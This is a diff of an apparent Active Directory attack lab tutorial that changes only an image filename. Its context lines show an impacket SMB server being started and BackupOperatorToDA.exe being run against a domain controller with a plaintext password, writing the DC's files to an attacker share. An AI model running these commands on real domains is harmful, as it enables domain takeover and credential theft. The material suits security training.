@@ -70,7 +70,7 @@ python3 /opt/impacket/examples/smbserver.py share ~/adlab -smb2support
 .\BackupOperatorToDA.exe -t \\dc03.secure.local -u sa_backup -p LS6RV5o8T9 -d secure.local -o \\192.168.248.2\share\
 ```
 
-![](<../../../.gitbook/assets/image (68).png>)
+![](<../../../.gitbook/assets/image (68) (1).png>)
 
 {% hint style="info" %}
 If you are using another share, make sure the share is writeable by anyone otherwise the DC won't be able to write its files.
